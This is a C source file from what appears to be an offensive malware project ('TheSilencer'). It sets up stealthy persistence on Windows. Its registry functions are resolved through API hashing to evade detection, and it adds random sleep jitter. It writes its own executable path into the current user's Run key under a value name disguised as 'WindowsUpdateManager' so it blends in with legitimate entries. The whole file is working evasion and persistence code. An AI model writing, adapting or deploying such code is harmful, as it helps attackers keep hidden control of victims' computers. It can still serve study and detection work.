// "@Yenn.exe | TheSilencer Project 
// API hashing, dynamic key generation, and entropy-based timing functions

#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "FunctionPntrs.h"
#include "Debug.h"

// Function type definitions
typedef LSTATUS (WINAPI* fnRegCreateKeyExW)(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
typedef LSTATUS (WINAPI* fnRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LSTATUS (WINAPI* fnRegCloseKey)(HKEY);
typedef HMODULE (WINAPI* fnLoadLibraryA)(LPCSTR);

// -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Entropy-based timing function
// GetTickCount is the system uptime in milliseconds 
// GetCurrentProcessId returns the process ID of the calling process
// entropy is generated by XORing (^ Exclusive OR) these two values which is a bitwise operation that combines the bits of both values and produces a new value that is less predictable.
// Sleep is used to pause the execution for a random duration between 50 and 550 milliseconds
// also getting the remainder of the division of entropy by 500, which will give a value between 0 and 499, then adding 50 to it, resulting in a sleep time between 50 and 550 milliseconds
VOID XmJitterSleep(VOID) {
    DWORD entropy = GetTickCount() ^ GetCurrentProcessId();
	Sleep(50 + (entropy % 500)); 
}
// -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


// -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Dynamic key path generation with improved obfuscation
VOID XmGenerateSubKey(PWCHAR Buffer, SIZE_T Size) {
    // Instead of random locations, we'll use Run key but with obfuscated value name
    const WCHAR* basePath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    SIZE_T baseLen = 0;
    
    // Copy base path
    while(baseLen < Size - 1 && basePath[baseLen]) {
        Buffer[baseLen] = basePath[baseLen];
        baseLen++;
    }
    Buffer[baseLen] = L'\0';
}
// -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



// Function to set persistence in the registry
BOOL XmSetPersistence(VOID) {
#ifdef DEBUG
    PRINT("[*] Starting persistence setup...\n");
#endif

    WCHAR wszPath[MAX_PATH] = { 0 };
    WCHAR wszKeyPath[MAX_PATH] = { 0 };
    HKEY hKey = NULL;
    BOOL bSuccess = FALSE;

    // Get current module path
    if (GetModuleFileNameW(NULL, wszPath, MAX_PATH) == 0) {
#ifdef DEBUG
        PRINT("[-] Failed to get module path. Error: %d\n", GetLastError());
#endif
        return FALSE;
    }

#ifdef DEBUG
    PRINT("[*] Module path: %ws\n", wszPath);
#endif

    XmJitterSleep();

    // First load advapi32.dll using LoadLibraryA
    HMODULE hKernel32 = GetModuleHandleH(SYSTEM_PROTOCOL_DLL_HASH);
    if (!hKernel32) {
#ifdef DEBUG
        PRINT("[-] Failed to get kernel32.dll handle\n");
#endif
        return FALSE;
    }

    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, DLL_LOAD_HASH);
    if (!pLoadLibraryA) {
#ifdef DEBUG
        PRINT("[-] Failed to get LoadLibraryA\n");
#endif
        return FALSE;
    }

    // Load advapi32.dll
    pLoadLibraryA("advapi32.dll");

    // Now get the handle to advapi32.dll
    HMODULE hAdvapi = GetModuleHandleH(advapi32dll_DJB2);
    if (!hAdvapi) {
#ifdef DEBUG
        PRINT("[-] Failed to get advapi32.dll handle\n");
#endif
        return FALSE;
    }

#ifdef DEBUG
    PRINT("[+] Successfully loaded advapi32.dll\n");
#endif

    fnRegCreateKeyExW pRegCreateKeyExW = (fnRegCreateKeyExW)GetProcAddressH(
        hAdvapi,
        REG_CREATE_HASH
    );

    if (!pRegCreateKeyExW) {
#ifdef DEBUG
        PRINT("[-] Failed to get RegCreateKeyExW\n");
#endif
        return FALSE;
    }

    fnRegSetValueExW pRegSetValueExW = (fnRegSetValueExW)GetProcAddressH(
        hAdvapi,
        REG_SET_VALUE_HASH
    );

    if (!pRegSetValueExW) {
#ifdef DEBUG
        PRINT("[-] Failed to get RegSetValueExW\n");
#endif
        return FALSE;
    }

    fnRegCloseKey pCloseKey = (fnRegCloseKey)GetProcAddressH(
        hAdvapi,
        REG_CLOSE_KEY_HASH
    );

    if (!pCloseKey) {
#ifdef DEBUG
        PRINT("[-] Failed to get RegCloseKey\n");
#endif
        return FALSE;
    }

#ifdef DEBUG
    PRINT("[+] Registry functions resolved\n");
#endif

    // Generate single unique key path
    XmGenerateSubKey(wszKeyPath, MAX_PATH);

#ifdef DEBUG
    PRINT("[*] Generated registry key path: %ws\n", wszKeyPath);
#endif

    // Generate less obvious value name to blend with Windows Update related entries
    WCHAR wszValueName[32] = { 0 };
    DWORD entropy = GetTickCount() ^ GetCurrentProcessId();
    wsprintfW(wszValueName, L"WindowsUpdateManager%x",
        (entropy & 0xFFFF));

#ifdef DEBUG
    PRINT("[*] Creating registry key...\n");
#endif

    DWORD dwError = 0;
    if (pRegCreateKeyExW(HKEY_CURRENT_USER, wszKeyPath, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        XmJitterSleep();

#ifdef DEBUG
        PRINT("[+] Key created successfully\n");
        PRINT("[*] Setting registry value...\n");
#endif

        DWORD cbData = (DWORD)((wcslen(wszPath) + 1) * sizeof(WCHAR));
        if (pRegSetValueExW(hKey, wszValueName, 0, REG_SZ,
            (BYTE*)wszPath, cbData) == ERROR_SUCCESS) {

#ifdef DEBUG
            PRINT("[+] Value set successfully\n");
#endif
            bSuccess = TRUE;
        }
        else {
            dwError = GetLastError();
#ifdef DEBUG
            PRINT("[-] Failed to set value. Error: %d\n", dwError);
#endif
        }

        if (hKey) {
            pCloseKey(hKey);
            hKey = NULL;
        }
    }
    else {
        dwError = GetLastError();
#ifdef DEBUG
        PRINT("[-] Failed to create key. Error: %d\n", dwError);
#endif
    }

    // Cleanup sensitive data
    RtlSecureZeroMemory(wszKeyPath, sizeof(wszKeyPath));
    RtlSecureZeroMemory(wszValueName, sizeof(wszValueName));
    RtlSecureZeroMemory(wszPath, sizeof(wszPath));

    return bSuccess;
}

